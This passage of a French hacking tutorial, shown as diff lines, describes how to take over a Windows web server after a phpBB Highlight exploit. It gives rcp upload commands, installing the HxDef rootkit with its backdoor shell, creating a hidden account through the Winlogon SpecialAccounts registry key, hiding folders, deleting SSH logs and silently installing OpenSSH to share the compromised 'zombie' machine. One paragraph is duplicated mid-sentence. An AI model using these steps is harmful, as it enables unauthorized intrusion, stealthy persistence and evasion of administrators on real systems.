+et 2500, mais que les processus systèmes possèdent des PID  inférieurs  a 1000.
+Méfiance cependant, n'accordez pas une  confiance  complète a un  processus qui
+arbore un PID très bas ...
+
+	Bien, une fois votre cible mise a nue, nous pouvons passer à la partie
+suivante, qui commence à devenir intéressante.
+
+
+
+
+(~~ Partie IV : Faire main basse sur la machine ~~)
+
+
+	Hey, évidemment,  je me doute que si vous êtes arrivés jusque la, c'est
+pas trop pour le  plaisir  de  dire  "Youpi,  j'ai  stoppé 4  services  sur  un
+ordinateur, je suis un h4x0r de ouf qui déchire sa mère la pomme de terre" ( et
+encore une  fois,  ca rime ! Décidemment,  Icing, quel poête... ), mais  plutôt
+pour avoir réussi à vous créer votre petit  espace  sur  cette  dite  machine ( 
+surtout après passé autant de temps a chercher ces  satanés  noms  de  services
+corresondants aux executables ), vous êtes tout frétillants  et  impatients  de
+poser votre petit trojan, et de repartir, hein ? Oui, mais alors deux questions
+s'offrent à vous : La première, si vous êtes un peu  censé,  est :  Comment  le
+transferer ?, la seconde serait plutôt du genre  de  "Mais  pour  le  cacher  a
+l'antivirus, faudrait le rendre indetectable !". Hu, oui,  mais  c'est  pas  le
+sujet aujourd'hui, peut être un autre jour, pour la prochaine release, qui sait
+? :)
+
+	Quoiqu'il en soit, vous avez cependant  soulevé  une  bonne  question :
+Comment transferer son fichier executable sur la machine distante ? Par le  FTP
+? Bonne suggestion, mais vous  n'avez  pas  de  console,  et  donc,  pas  moyen
+d'entrer login, pass, et tout le reste. Par une  technique  visant a  faire des
+"echo *commande*>>ftp.txt", puis, lorsque  tout est rempli, "ftp.exe<ftp.txt" ?
+Encore une bonne idée, qui effectivement contrerait le fait de ne pas avoir  de
+console. Problème : lors  de  l'execution  de  l'exploit  phpBB  Highlight, les
+commandes systèmes s'executent souvent plusieurs fois, probablement a cause  de
+plusieurs threads lancés pour charger la page, ou a cause de  plusieurs  appels
+successifs au champ Highlight  dans  le  fichier  viewtopic.php.  Votre fichier
+ftp.txt serait donc rempli de  commandes se répetant, et je ne pense pas que ca
+fonctionne ainsi.Oui, bon,  alors,  comment on peut faire ? La solution se loge
+dans ce qu'on appelle le RCP. 
+
+	RCP : RemoteCopyFile. Ceci est un dérivé des commandes R, qui permet
+de copier a distance  un  fichier. Très  pratique,  quoiqu'un  peu  compliqué à
+mettre en place, cette commande utilise le fichier rcp.exe situé dans System32,
+qui est bien souvent occulté par les Administrateurs soucieux : On a donc  plus
+souvent la possiblité d'uploader ce que l'on  veut sur  le serveur distant.  La
+syntaxe de cette commande est de type : 
+
+rcp -b*IP*.*Login*:*fichier distant* *fichier local*.
+
+ATTENTION ! Il ne faut SURTOUT PAS mettre de chemin dans la  variable  "Fichier
+Local", car  dans  ce  cas la,  la  commande RCP ne  fonctionnerait pas.  Cette
+commande doit être lancé a partir du PC distant afin qu'il télécharge sur votre
+ordinateur le bon fichier, qui doit être situé dans le dossier du serveur  RCP.
+Petit résumé de "Comment monter son propre serveur RCP".
+
+	Afin de creer   votre  propre  serveur RCP,  vous  devez  tout  d'abord
+télécharger un fichier, nommé rcp32bit.exe. Après quelques recherches, je  n'ai
+pas pu trouver le bon fichier serveur, donc, je l'ai uploadé a partir de mon PC
+vers un FTP chez Free. URL Disponible dans la section "Resources", tout en bas.
+Ainsi donc, après avoir téléchargé ce  fichier,  creez un  dossier  dans  votre
+disque dur, mettons C:\rcp\. Mettez le fichier qvt32bit dedans, et executez le.
+Des fichiers sont alors décompressés dans le repertoire courant,  des  fichiers
+de toute sorte, soit dit en passant. Executez alors QVTNET32.exe, ce  qui  aura
+pour effet de vous obtenir une jolie GUI.  Cliquez  alors  sur  Services,  puis
+Servers, afin d'aller dans les options. Cliquez sur "On" en ce qui concerne  le
+serveur  RCP,  et  dans  le  champ  a  propos  du  fichier   password,   entrez
+"C:\rcp\passwd.txt"  ( par  exemple ),  cliquez  sur  "Set Defaults",  puis OK.
+Ensuite, lancez un invite de commande, et rendez  vous  dans  le  dossier  RCP.
+Executez alors le fichier passwd.exe,  avec le  parametre  "passwd.txt".  Votre
+ligne de commande ressemblera alors a "passwd.exe passwd.txt". Vous aurez alors
+le choix de rajouter un utilisateur, en retirer,  changer,  bref,  de  modifier
+tout ça. Entrez donc  A, afin  de  creer  un utilisateur, remplissez les champs
+demandés ( Utilisateur, password .. ), puis, lorsque tout est terminé,  quittez
+ce programme. Redemarrez QVTNET32, et  voila,  votre  serveur  RCP  est  prêt à
+uploader ce que vous désirez sur n'importe  quelle  machine  ( pourvu qu'il n'y
+ait pas de firewall, bien sur. ). 
+
+	Pour mettre des fichiers a votre disposition, vous  devez  les  mettres
+dans le même dossier que celui du serveur  RCP. Oui, c'est assez  fouilli, mais
+pas trop le choix, donc, on fait avec. :) Vous  pouvez tester la fonctionnalité
+de votre serveur RCP en entrant la commande :
+"rcp -b 127.0.0.1.*login*:rcp32bit.exe test.exe"
+regardez votre fenêtre de status du serveur RCP,  si vous y voyez que vous êtes
+en   train   de  copier  le  fichier  vers "*login*", ou  *login*  est  le  nom
+d'utilisateur que vous avez spécifié auparavant, alors c'est  que tout  marche.
+Vous êtes donc prêt à uploader, mais avant cela, regardons un peu  la forme  de
+la commande que nous venons de tester. Elle est bien  de  la  syntaxe  précisée
+plus haut, mais nous avons rajouté un  commutateur, ici -b.  C'est  un argument
+qui spécifie le mode de  transfert  binaire,  donc,  pour  les .exe  et  autres
+executables. Dans le cas de transferts de fichiers textes, vous devez spécifier
+le mode -a ou bien ne rien mettre du tout ( le mode ASCII  étant  le  mode  par
+défaut. ) Attention, si jamais vous oubliez de mettre le commutateur -b pour un
+transfert d'executable, le résultat ne marchera pas. Vous êtes prévenu :)
+
+	Dernière chose, ne confondez pas RCP et RPC. RCP est une possibilité de
+transferts entre deux ordinateurs et  veut  dire  RemoteCopyFile.  RPC  est  un
+service Windows, permettant a des applications d'interagir entre elles, et veut
+dire RemoteProcedureCall. C'est totalement différent.
+
+	Bien, ainsi donc tout est prêt, vous pouvez uploader. Puisque vous avez
+désactivé  les  défenses  de  la  cible, cela  devrait  être  un  jeu  d'enfant
+maintenant. Tentez de faire votre upload, et verifiez le status sur la  fenêtre
+de votre serveur RCP. Si vous voyez que le  transfert  commence,  c'est  gagné.
+Oui, mais attendez, on transfert quoi ? On a toujours  pas  répondu,  a ça ! Ha
+ben oui, tiens, j'avais oublié :)
+
+	Hé bien, nous avons içi plusieurs  problèmes  face  a  "Que choisir ?".
+Nous cherchons donc un programme nous  permettant  de  prendre  controle total,
+le plus pratique possible, si possible  sécurisé, et  surtout,  furtif. Hé  ben
+c'est pas  gagné. Mais  la solution existe ! Et  elle  s'appelle : Rootkit.  Ce
+petit mot merveilleux désigne un pack, souvent, d'une relative  petite  taille.
+Nous pourrions prendre des trojans, oui, bien évidemment. On fait de nos  jours
+des trojans superbement furtifs, avec des injections dans tous les  coins,  des
+injections de codes en mémoire directement, bref, des trucs géniaux et qui nous
+permettent de prendre le controle. Mwi, mais coté furtivité c'est pas  le top :
+le fichier est détectable par les antivirus, et il  laisse des  traces  sur  le
+disque dur. En plus, coté controle, on  a  vu  mieux. (  Enfin,  ca  permet  du
+controle, mais vous verrez les possiblités  du rootkit, et vous vous rangerez à
+mon drapeau quand vous le saurez :D ). C'est  alors  qu'intervient le rootkit !
+*roulement de tambour*
+
+	Rootkit : Allons y pour le rootkit ! Ce petit  programme  mystérieux
+recèle en fait un pouvoir énorme. Sa puissance est basé sur le hook  d'API.  Il
+consiste a "détourner" les fonctions de Windows, afin de les faire passer   via
+le rootkit. Il agit comme une "interface"  entre  le  noyau  système et  ce que
+l'utilisateur voit. En temps normal, nous avons un shéma comme celui ci :
+utilisateur <===> noyau.
+Lors de la pose  d'un rootkit, il s'interpose  entre le noyau et  l'utilisateur
+afin d'agir comme un filtre, agissant  au bon  gré du  hacker. Nous avons  donc
+un shéma comme celui ci :
+
+ utilisateur <===> rootkit <===> noyau.
+
+Bien entendu, tout  ceci  est  transparant  pour  l'utilisateur,  qui  ne  voit
+absolument rien. Le hackeur peut ainsi définir ce qu'il vaut cacher ou non, que
+ce soit un processus, un fichier, une DLL,  un handle,  un profil,  un dossier,
+une  connexion,  tout  est  possible. On  peut  ainsi  cacher  certains  ports,
+falsifier l'espace disque disponible ( en retirer, en  ajouter ...  l'utilité ?
+Imaginez que vous soyez un stro-maker, personne dans le warez se  chargeant  de
+faire des FTP illégaux. Hé bien, ajoutez des fichiers, souvent des films ... ca
+prend énormement de place ! Modifiez alors  l'espace  libre  affiché  grace  au
+rootkit, et vous serez tranquille. Imaginez que  vous  placiez  un  fichier  de
+700Mo, si dans les configurations du rootkit vous définissez de retirer 700Mo a
+la place actuelle, la place disponible reviendra  a la  normale  virtuellement.
+Physiquement, non, et le fichier sera accessible, mais pour  l'utilisateur,  la
+place restera la même alors qu'un énorme fichier est sur son  disque dur.  Ceci
+permet une plus grande furtivité ), lancer certains  fichiers au  démarrage  de
+manière cachée, cacher des services, des clées de registre... tout. Ceci  grace
+a ce qu'on appelle un "driver", un fichier  système. Et le mieux : Vous  pouvez
+définir les processus non affectés par le rootkit.  Vous pouvez donc  dire  que
+tel processus sera caché, mais affecté par le rootkit, alors que celui la  sera
+non caché mais affecté par le rootkit, et celui ci caché et non affecté, ce qui
+lui donnera les mêmes aptitudes que  le rootkit : une  furtivité  quasi-totale.
+Pour nos exemples, nous  utiliserons  le  celèbre  HackerDefender  ( HxDef ) de
+Holy_Father. Cf Resources, encore une fois.Il est constitué  de deux  fichiers,
+le fichier hxdef100.exe, qui  est  le  rootkit  en  lui  même,  et  le  fichier
+hxdef100.ini, qui lui contient  tous  les  paramètres  pour  le  rootkit,  pour
+définir ce qu'il doit faire, cacher ou ne pas cacher, etc... Comment le rootkit
+se cache-t-il ainsi ? Il modifie en fait dans chaque processus un petit bout de
+mémoire, la ou sont  stockées  les  adresses  des  API,  afin  que  toutes  les
+demandent passent par le driver du rootkit, et qu'il puisse les examiner. Si il
+detecte dans les demandes un nom qui doit être normalement caché, il  l'efface,
+purement et simplement. Ainsi, si dans un listing, il apercoit venant du  noyau
+vers l'utilisateur le mot "Test" alorsque celui ci est  écrit  caché  dans  les
+paramètres de hxdef100.ini, il effacera  l'entrée  de  Test  dans  le  listing.
+L'utilisateur voit ainsi le dossier comme tous les autres dossiers,  mais  sans
+le dossier Test qui a été supprimé du listing, mais qui est tout  de  même  là.
+Nous avons choisis ce rootkit  car il  inclue une  backdoor, mais une  backdoor
+spéciale : En fait, puisque toutes les requêtes sont filtrées par  le  rootkit,
+il peut filtrer aussi les requêtes TCP/IP. Et donc, il peut détecter si oui  ou
+non, cette requête lui est adressé ... en se connectant  donc  avec  le  client
+spécial livré dans le pack, on peut se connecter a la backdoor  du  rootkit, un
+shell non rootkité, donc, voyant tous  les  fichiers  cachés  ou  non.  Comment
+fait-il ? Le client envoie une certaine séquence au rootkit, qui examine chaque
+requête TCP. S'il repère la séquence spéciale,  il  ouvre  alors  le  shell  et
+redirige les données  venant  du  client  vers  ce shell. J'entends  venir  les
+questions des habitués du troy, "mais il manque   un  truc,  par  quel  port on
+entre?". C'est maintenant que joue le sublime du rootkit, par n'importe lequel.
+Il suffit d'un port  ouvert,  et  ca  suffit.  Evidemment,  puisque  toutes les
+requêtes sont  examinées et  filtrées,  on  peut donc  en  conclusion  utiliser
+n'importe quel port pour  entrer ! En  voila  une  bonne  nouvelle  ... surtout
+qu'avec Windows, les ports ouverts c'est pas ce qui manque...
+
+	Pour retirer le rootkit, plusieurs solutions : Si vous avez vous même
+installé le rootkit, et que vous connaissez son repertoire d'installation, et
+quel programme n'est pas affecté, alors utilisez ce programme pour aller dans
+le dossier du rootkit, et executez le avec l'argument "-:uninstall"  dans  le
+cas de HxDef. Pour les  autres  rootkit, la  méthode de  désinstallation peut
+varier d'un programme a un autre. Si vous n'avez  pas  installé  ce  rootkit,
+mais que vous êtes infectés, des programmes spéciaux vous  permettent  de les
+détecter,  tel  que  "Rootkit  Revealer"  de  SysInternals.  Vous   trouverez
+l'adresse dans la section "Resources".
+
+	L'avantage d'utiliser ce genre de système  pour  les  serveurs  webs,
+c'est que même avec un firewall, leur port 80 est constamment  ouvert,  donc,
+pas de problème pour entrer. On peut ensuite killer tout ce  qu'on  veut  via
+les NET STOP et les autres tskill. Bref, nous pouvons avoir un controle total
+avec une furtivité optimale. Le pied. Seulement voila,  un shell, c'est  bien
+joli, mais on peut pas faire énorment de choses avec, même  si  on  a  effec-
+	L'avantage d'utiliser ce genre de système  pour  les  serveurs  webs,
+c'est que même avec un firewall, leur port 80 est constamment  ouvert,  donc,
+pas de problème pour entrer. On peut ensuite killer tout ce  qu'on  veut  via
+les NET STOP et les autres tskill. Bref, nous pouvons avoir un controle total
+tivement un controle total sur l'ordinateur, il  manque un  petit "plus"  qui
+nous changerait la vie ( un peu  comme  les Sims, en gros. ) Enfin, on  verra
+ça plus tard. Pour l'instant, nous  pouvons  exploiter  tranquillement  notre
+petite machine cible, grace a notre exploit sympathique qui  nous  donne  les
+URL avec dedans, en double-encodé, les commandes systèmes. Utilisez  donc  du
+RCP afin de copier vos fichiers sur la  machine  cible ... vous  avez  copiés
+hxdef100.exe, puis  hxdef100.ini ( que  vous avez  préalablement  édité  afin
+qu'il réponde mieux à vos besoins ) ? Oui ? Alors ne  l'executez surtout  pas
+maintenant. Pourquoi ? Tout simplement, encore un petit travail de reflexion.
+Lorsque vous executez RCP via une URL, ce n'est pas le système qui appelle le
+programme RCP, mais bien le programme du serveur web (ex: Apache.exe ). Donc,
+son repertoire de travail sera le même que la page  php  qui  elle  a  appelé
+php.exe, qui fait  partie  d'Apache ...  et  nous  nous  retrouvons  dans  le
+répertoire du forum  ! Certains me répondront "on s'en fout ... on execute et
+on a accès.", oui, mais non.. parce que si vous executez le programme dans ce
+repertoire, et  qu'un  jour l'administrateur veut supprimer ce repertoire, il
+le  verra  en  cours  d'utilisation  alors  que  rien dedans n'est censé être
+executé. Soupçon, et avec quelques recherches vous  êtes  reperé ... donc, il
+faut les bouger autre part, dans un dossier  qu'il  ne  supprimera  jamais ..
+pourquoi pas .. System32 ? Oui, mais vu qu'on ne connait pas le repertoire de
+Windows, ca va être difficile.  Encore  une  fois,  utilisons  les  variables
+d'environnement,   et   entrons  dans  la  ligne  de    commande   un   petit
+"%windir%\System32\", et vous voila certains d'arriver  à vos fins. Un simple
+"copy" puis "del" suffira, ou, si vous êtes pressé,  "move", qui fera la même
+chose     mais    en     une    ligne    de    commande.   Ensuite,   eecutez
+"%windir%\System32\hxdef100", et voila, vous avez accès à l'ordinateur via le
+client de HxDef, qui vous fournira un shell, gentiment. Et  si  nous  allions
+plus loin ? Quitte à se faire arrêter pour maintien d'un accès illégitime sur
+un système informatisé, autant se faire arrêter pour avoir  réalisé  un  vrai
+travail de pro, et pas pour une broutille de  rootkit  installé  grace à  une
+faille ! Faisons travailler nos méninges, et faisons de cet ordinateur  notre
+joujou ...
+
+
+
+
+(~~ Partie V : Installation manuelle d'OpenSSH sur un noyau Win32 ~~)
+
+
+	Bon, alors, voyons ... nous avons maintenant un accès total  via  une
+console sur l'ordinateur, le tout protegé par un rootkit. La prochaine  étape
+semblerait soit d'aposer notre tag sur l a machine  ( notre  "signature" , en
+gros ), soit d'en faire notre petit zombie a nous .. ( zombie : Machine rooté
+, permettant d'en faire ce que l'on veut.  Elle agit au  doigt et  a  l'oeil,
+c'est une box préalablement hackée ) Nous  choisirons  l'option "zombie" ! Au
+point ou nous en sommes, pas la peine d'aposer un tag  pour le  fun, hacker,
+oui, mais hacker utile ! Autant y poser un SSH, non ? 
+
+	SSH : Ce protocole ( et programme ) est un protocole très sécurisé
+, ou tout est encrypté entre les deux  machines. L'authentification  peut  se
+faire de plusieurs manières, que ce soit par IP, par empreinte RSA, par login
+/ pass ... les moyens sont variés. Il y a eu plusieurs protocoles de SSH,  et
+la dernière est la version 2. Grace à la suite de programme venant  avec SSH,
+son client, son  serveur,  et  tout  le  reste,  on  peut  executer  beaucoup
+d'actions : On peut par exemple creer un "SFTP", abréviation de  "SecureFTP",
+un SCP, abréaviation de "SecureCopy(File)",  du port  forwarding  ( technique
+qui consiste a rediriger les données venant dans un port vers  une  autre IP,
+sur un autre port. Une sorte de proxy, en gros :) ), bref, pas mal de  trucs,
+dont un shell ( soit dit en passant ). Ce genre de programme et serveur  peut
+être très utile dans le cas d'un "bounce", en gros  un  "saut"  de  plus dans
+votre connexion, une sorte de  proxy, en  gros.  Vous  pouvez  donc  y  faire
+absolument tout ce que vous voulez, et, le mieux, c'est que tout est  crypté,
+avec un cryptage bien puissant, ce qui rend les choses encore plus faciles et
+sécurisées.
+
+	Comme vous le voyez, la solution optimale serait  de poser un serveur
+SSH sur notre nouvelle machine, car de cette manière, nous pourrions partager
+notre accès  avec  nos  "amis". Bien,  on  recherche  donc  un  serveur  SSH,
+fonctionnant sous  Windows,  gratuit,  et facile  d'installation. Génial,  on
+trouve exactement ce que  l'on  veut, j'ai  nommé : OpenSSH ! C'est  un  pack
+comprenant des tools, pour  le  client / serveur  SSH,  avec  tout  ce  qu'il
+l'accompagne. Pour être net, il s'agit d'une version  portée  d'un  SSH  sous
+Linux, donc, nous avons besoin pour tout ça des  DLL  de  Cygwin,  le celèbre
+émulateur Linux de Windows. Bien,  allez  donc  sur  le  site  d'OpenSSH,  et
+téléchargez la version Binaire pour Windows (URL dans la section "Resources",
+à la fin ). Ca peut être un peu long, tout dépend de votre connexion :)
+
+	Une fois que  vous l'avez, décompressez l'archive,  et  admirez  : Un
+setup. ARGH !  C'est  pas  bon  du  tout  pour  nous,  ça ... hey, si on veut
+l'installer chez  une  victime, faudrait peut être éviter qu'il ait a cliquer
+sur les options du setup d'OpenSSH  pour l'installer, ou alors c'est vraiment
+un bon gros pigeon comme on en fait  plus.  Bref,  nous  voila  bien, on a un
+setup, mais   pas  d'archive  contenant  tout  en  "prêt-à-utiliser".  Pas de
+problèmes, il  suffit de recreer le comportement du setup, ou bien de trouver
+la ligne de  commande  pour  le  lancer  en  mode  "caché / silentieux" !  La
+plupart des setup des programmes aujourd'hui ont cette option, en fait,  elle
+consiste a lancer le setup en ligne de commande avec un argument du genre  de
+"/s", "/q", "/silent", "/quiet", "/hidden",  et  lors  de  l'execution,  tout
+s'éxecute normalement,  avec  les  options  par  défaut,  sans  aucun  besoin
+d'interaction avec l'utilisateur, ce qui est bien  pratique  pour  nous.  Oui
+mais voila, avant tout ça, faudrait peut être  l'installer, OpenSSH, avant de
+continuer, non ? Ca nous permettrait de visualiser  un peu ce qu'il contient,
+pour  mieux  reproduire  son  comportement.  Nous  l'installons donc avec les
+options  par  défaut,  et  nous nous  rendons  dans le  dossier  "/docs", qui
+contient ...  des  documents. Oui,  logique. Entre  autres,  parmi  tous  ces
+documents, le readme d'OpenSSH, que l'on s'empresse de lire ! C'est alors que
+la désillusion a lieu : Nous voyons  une jolie  note  qui  dit  que  le  mode
+silencieux a été plannifié, mais  toujours  pas  implémenté  dans  le  setup,
+c'est vrai, après tout c'est pas primordial, comme truc. On oublie donc cette
+histoire de ligne de commande, et on cherche  à reproduire le comportement du
+setup : il  suffit  de  voir  ce  qu'il  décompresse,  installe, désinstalle,
+éxecute,  inscrit  dans  le  registre  et  tout  ça. Simple ? Pas du tout, au
+contraire. Toutes les informations défilent très  vite,  et il est très dur (
+voir impossible ) de capter toutes les  informations,  pour  une installation
+complète et  manuelle. Et pour  mieux  installer, il faut réflechir un peu et
+continuer a  lire  le readme. Dans celui ci, une section nous indique comment
+désinstaller manuellement  OpenSSH,  et  on  voit que le principe reste assez
+simple, et basique (suppression du service OpenSSH, suppression des fichiers,
+et de quelques clées de registre ). Bon, nous connaissons donc  l'emplacement
+de la clée comprenant des  informations  importantes  ( vitales ? )  pour  le
+serveur SSH, a savoir une  clée nommée "Cygnus Solutions"  dans  HKLM,
+clée qui contient des informations a propos de certains dossiers et de  leurs
+aliases   (   Par   exemple,   que    la    variable   /usr/    pointe   vers
+C:\Program Files\OpenSSH\ , ce genre de  choses .. ),  aliases  qui  pourront
+ainsi être utilisés par les programmes de SSH. Nous avons donc  une  clée  de
+registre a installer, c'est un bon début. Nous savons aussi que  mis  a  part
+le service, les fichiers du dossier  OpenSSH,  et  les  clées,  rien  d'autre
+n'est installé. C'est déja pas mal, oui, je sais.
+
+	 Néanmoins, on remarque quelques trucs : le  service,  nommé OpenSSH,
+pointe vers un  programme  nommé  cygrunsrv.exe,  situé  dans  /bin/ de votre
+dossier OpenSSH. Oui, mais quand on lance ce programme, on  arrive  justement
+a des ptites informations affichées, mais seulement en ligne de commande.  On
+tente alors un "--help", histoire d'avoir desinformations supplémentaires. Et
+ô miracle, on se rend compte que ce programme sert à ... installer, supprimer
+, démarrer, stopper des services. Bondiou, ca veut dire  que  nous  avons  un
+service, qui arrive a lancer le serveur SSH ( puisqu'au démarrage, nous avons
+un processus  sshd.exe  dans  notre  liste,  et  que nous arrivons à  nous  y
+connecter correctement ), alors que ce même service pointe vers un executable
+qui lui même peut lancer un service ? Une chaine de service? Même  pas,  nous
+pouvons voir en affichant les proprietés du service qu'aucun  argument  entre
+en ligne de commande lors de l'execution du   service. Mais  alors  comment ?
+Une fois encore, la base de registre. En y recherchant la  clée de cygrunsrv,
+vous pourrez vous rendre compte que la clée désignant le service OpenSSH  est
+un peu .. "spéciale". En réalité, elle possède plus de valeurs que les autres
+services, et, parmis ces valeurs, le chemin de l'executable correspondant  au
+serveur SSH. Nous pouvons  essayer  de le  recreer  nous  même, ce  service :
+Executez le fichier cygrunsrv.exe, avec  en  paramètre, la ligne de  commande
+suivante : "-I "Test Service" -p "C:\Windows\notepad.exe" ... et vous  verrez
+que vous installerez les  mêmes  clées.  Pourtant !  Une erreur est  signalée
+lors de l'installation de ce service, comme quoi le programme n'arrive  pas a
+déterminer son statut, et donc  savoir  s'il  est  actif  ou non. Soit,  mais
+pourtant : Votre service est installé, et l'executable  de  Notepad lancé  si
+vous démarrez le service, même si vous obtenez de nouveau un message d'erreur
+comme quoi le service n'a pas été lancé. Et pourtant, Notepad est la. Ne vous
+fiez donc pas a ces messages, regardez plutôt la liste des processus actifs ;)
+
+	Bon, nous  avons  donc  désormais  les  clées  nécéssaires  pour  les
+references a CygWin, nous savons comment creer le service  OpenSSH,  il  nous
+faut  désormais organisr un peu le "pack", savoir quoi mettre, quoi  inclure,
+quoi retirer pour que ca prenne moins de place ... un dossier que  l'on  peut
+retirer est directement le dossier des documents, qui, il faut l'avouer,  sur
+un serveur distant ne servent pas a grand chose. Un autre  fichier a  retirer
+est un fichier logé dans /var/log, en fait, tous les fichiers la  dedans sont
+a supprimer, car ils contiennent les informations de "qui  s'est  connecté le
+dernier, les dernières IP connectées auservice, quel login, etc"... bref, pas
+très intéressant pour nous et  même  mauvais,  finalement. Donc, on  supprime
+tout ça, et ca évite déja quelques logs en plus. Je vous conseille de laisser
+tout le reste, si vous voulez que tout le reste marche :)
+
+	Maintenant que nous avons les fichiers nécéssaires, les  inscriptions
+dans le registre a faire, et le service à créer, maintenant que  nous  savons
+faire tout ça, intéressons nous a ce que nous  devrions  faire  pour que tout
+marche. En fait, nous  devons  suivre  les  instructions  inscrites  dans  le
+readme, et executer deux programmes, nommés  mkpassd.exe  et  mkgroup.exe. De
+cette manière, ces programmes vont se  charger de  recuperer  les  logins  et
+password des comptes d'utilisateurs  et  groupes  de  l'ordinateur,  et   les
+inscrires dans le fichier que nous  voulons. Nous  devons  donc les  inscrire
+dans les fichiers regardés par SSH et son serveur, a  savoir passwd  et group
+dans le dossier etc. Nous devons donc executer ces commandes :
+
+mkgroup -l -d >>..\etc\group mkpasswd -l -d >> ..\etc\passwd
+
+Executer ces deux programmes nous promet donc  des  accès  sur le  serveur, a
+deux conditions : la première, que tout ceci soit fait sur le serveur distant
+( logique ), et la deuxieme ... que  vous connaissiez les logins et  password
+des utilisateurs. Problème.On a donc deux solutions : La première, cracker le
+password de l'utilisateur : Dans ce cas, pwdump, on pompe les  logins, et  on
+crack tout ça au  bruteforce.  Pourquoi  pas,  mais  ca  peut  être  long  et
+fastidieux, pour n'aboutir a  rien. La deuxième solution ? Se créer un compte
+sur le PC, bien évidemment. Avec notre propre  compte,  notre  propre  login,
+notre propre password, ca facilite les choses. La furtivité ?
+? On s'en charge ! La première nouvelle,  c'est que l'on peut creer un compte
+possédant les caractéristiques des "Hidden Tables" de HxDef. Déja, comme  ça,
+il sera un peu mieux caché. La seconde option c'est en plus de se débrouiller
+pour que rien n'apparaisse .. on revoit alors nos petites techniques Windows.
+
+	Tout d'abord, voyons  quels  sont les créations les plus "flagrantes"
+lorsque l'on crée un  compte. La première chose  est a l'écran d'accueil : On
+voit directement qu'il y a  un login disponible en plus. Faisons  disparaitre
+ça! Il y a dans Windows une petite clée très utile, dans la base de registre,
+qui permet de creer des comptes "spéciaux", invisibles au login. Il s'agit de
+la clée située dans :
+HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAcounts\UserList
+
+Pour y mettre un compte invisible au login de démarrage de windows, il faut y
+ajouter une  clée de  type DWORD avec  comme valeur 0. De  cette manière,  le
+compte utilisateur ne sera pas affiché lors du login normal, sous XP,(Endroit
+ou vous avez tous vos ptits users  affichés de partout ), ni sous  le panneau
+de  configuration  (Youpi !)  Reste alors les  dossiers  dans  Documents  And
+Settings. Ici, nous avons donc plusieurs solutions : La première  est d'aller
+dans  Documents  And  Settings  avec  un  shell, et  de  taper  attrib  +S +H
+votre_user, ainsi, le dossier deviendra  caché et Système ( et  rare sont les
+gens non  soucieux  de  la  securité de  leurs forums  qui prennent la  peine
+d'afficher les fichiers systèmes, pour la bonne raison qu'il y en a  partout,
+c'est très gênant, et cerise sur le gateau, Microsoft nous demande bien "Etes
+vous sur, parce que capeut faire foirer votre système si vous  vous y  prenez
+comme un manche ?", donc, pas énormement de risques  pour  que  l'utilisateur
+lambda s'y risque. ) Ainsi  alliée a la première des  solutions qui  était de
+modifier le  rootkit, alors  on obtient  un comtpe  Windows  fichtrement bien
+caché.
+
+	Bien ! Après avoir créé ce compte fichtrement caché (c'est livré avec)
+,  nous pouvons donc faire les ptits configurations de OpenSSH, soit les deux
+commandes situées plus haut. Ainsi, nous aurons  un accès et  login  et notre
+choix sur la cible, et son serveur SSH, qui nous  donnera un  accès sur le PC 
+distant. Génial ! On  sait aussi  comment installer  le service !  Youpi ! On
+connait les clées CygWin a installer, et on peut  donc  installer  notre pack
+SSH manuellement ! Champagne !  Ma belle-mère  vient  manger  ce soir ! Fusil
+calibre 12 ! 
+
+	Faisons un petit résumé de ce que nous savons, de ce que nous  devons
+lancer, comment, pourquoi,  tout le  reste. Ca  sera  peut  être un  peu plus
+simple,  non ? ( Parce  que la, c'est  un peu  fouilli,  cette  histoire ! ).
+Voyons donc : 
+	- Les clées Cygwin, necessaires au bon fonctionnement de tout ce ptit
+monde: Elles se trouvent donc dans HKLM, sous la sous clée Software, dans une
+clée nommée "Cygnus Solutions". Pour les retardataires qui auraient du mal  a
+suivre, On doit donc créer une clée dans ce modèle : 
+HKEY_LOCAL_MACHINE\SOFTWARE\Cygnus Solutions,  clée qui elle  même  contenant
+une  sous  clée,  nommée CygWin,  contenant  deuxsous  clées, "mounts v2"  et
+"Program Options", la clée "mounts v2" contenant trois sous clées nommées "/"
+"/home", et "/usr/bin/", qui contiennent chacune les valeurs "flags" en DWORD
+mises a  10  ( ou "Ah" ), et  la  valeur  "native", comprenant le  chemin  du
+dossier  qui  aura  comme  alias  le  nom  de  la  clée. Oui, je sais,  c'est
+extrèmement bordélique, mais voici une  petite  explication : Si par exemple,
+dans la sous clée  nommée /home, une  valeur  native est  mise a "C:\", alors
+quand vous utiliserez la valeur "/home" dans  une  ligne  de  commandes  d'un
+programme utilisant CygWin, il va la "convertir" en C:\. Pas plus dur, une
+sorte "d'alias", en gros :] /home = C:\. Ca évite les antislash, entre autres.
+Le plus dur est passé, rassurez vous :D
+
+	- Après avoir installé ces clées, nous devons créer notre utilisateur
+	  Windows, le cacher avec une clée registre 	  	  	  	            	  (HKLM\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList),
+	  cacher son dossier dans Documents And Settings, et le cacher avec le
+          rootkit ( Triple protection :) )
+
+	- Puisque nous avons notre user caché, créer les logins & pass pour le
+          serveur SSH. Donc, on lance les programmes  mkgroup et mkpasswd avec
+	  les bons arguments, en écrivant  dans ..\etc\group et ..\etc\passwd.
+
+	- Problème ! Nos programmes marchent, certes, mais nous  avons tout de
+	  même un problème !  En effet, nos  programmes ont besoin des  dll de
+	  CygWin pour pouvoir fonctionner potablement... et la,deux solutions,
+	  comme  d'habitude  sous   Windows,  en   profitant   des   variables 
+	  d'environnements "Path". Lorsque nous sommes dans un dossier avec un
+	  shell, et que nous  voulons  executer un  programme, Windows  réagit
+	  comme ceci : il recherche d'abord dans le répertoire courant pour  y
+	  trouver le programme / fichier. Il suit ensuite une variable système
+	  d'environnement, nommée Path et dans laquelle on trouve des adresses
+	  de repertoires divers, mais parmis eux :
+	  C:\Windows\System32, C:\Windows ...
+	  donc, Windows va chercher d'abord dans le repertoire courant,  puis,
+	  remonter la variable pour arriver aux dossiers System32 et  Windows.
+	  Yeah. Vous commencez a apercevoir les o ptions ? Non ? Jvous  aide !
+	  ( profitez en ... _ ) En fait, on peut donc soit placer nos DLL dans
+	  System32 ou Windows ( qui sont communs a tous les windows ), soit on
+	  peut ajouter notre dossier contenant nos fichiers  dans la  variable
+	  "path". La  solution  la  plus  furtive  serait de  les placer  dans
+	  System32 pour la simple et bonne raison que l'on y trouve en moyenne
+	  quelques 2100 fichiers en comptant les repertoires, donc moults dll,
+	  et que donc, une de plus ou de moins, hein, peut importe. ( solution
